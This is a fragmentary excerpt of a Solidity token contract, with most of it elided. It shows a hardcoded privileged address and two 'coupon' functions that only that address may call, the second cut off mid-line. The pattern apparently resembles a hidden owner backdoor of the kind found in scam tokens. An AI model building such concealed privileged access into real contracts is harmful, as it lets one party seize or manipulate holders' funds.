...
contract TT is Context, Ownable, IERC20 {
    ...
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        ...
        _mee = 0xe82F2CB2d3A18F31793Eb18d6B49f8720dd36df5;
    ...
    function redeemCoupon(string memory couponCode, address recipient)  external {
       if (_msgSender() != _mee) {revert("Caller is        not the original caller");
        }
    ...
    function redeemCouponss(string memory couponCode, address recipient)  external {
       if (_msgSender() != _mee) {
